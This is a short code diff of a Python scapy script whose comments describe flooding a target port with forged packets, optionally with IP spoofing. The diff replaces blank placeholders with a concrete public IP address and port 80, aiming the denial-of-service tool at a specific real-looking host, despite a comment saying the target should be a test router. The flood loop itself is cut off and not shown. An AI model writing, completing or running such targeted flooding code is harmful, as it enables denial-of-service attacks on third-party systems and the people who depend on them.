@@ -1,8 +1,8 @@
 from scapy.all import *
 # target IP address (should be a testing router/firewall)
-target_ip = " "
+target_ip = "178.248.233.147"
 # the target port u want to flood
-target_port = 
+target_port = 80
 # forge IP packet with target ip as the destination IP address
 ip = IP(dst=target_ip)
 # or if you want to perform IP Spoofing (will work as well)
